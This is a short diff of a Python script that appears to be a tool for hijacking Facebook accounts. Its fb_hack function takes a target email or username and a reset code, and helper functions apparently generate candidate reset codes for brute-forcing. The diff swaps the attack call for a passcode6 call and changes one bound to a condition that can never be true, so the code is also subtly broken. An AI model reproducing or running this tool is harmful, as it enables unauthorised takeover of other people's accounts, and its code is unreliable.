@@ -28,7 +28,7 @@ def setup_browser(self):
 def passcode8(pass0):
   pass1 = int(pass0)
   pass2 = int(pass0)
-  if pass1 < 1000000 and pass1 > 99999:
+  if pass1 < 10**5 and pass1 > 99999:
     pass2 = str(pass1)
     h = ""
     code = ("0", str(pass2))
@@ -191,4 +191,6 @@ def fb_hack(email, codex):
 os.system('clear')
 ehack = input('Email address or username to attack:')
 reset = input('Code: ') or 99999999
-fb_hack(ehack, reset)
+"""fb_hack(ehack, reset)"""
+reset = input('Code:')
+passcode6(reset)
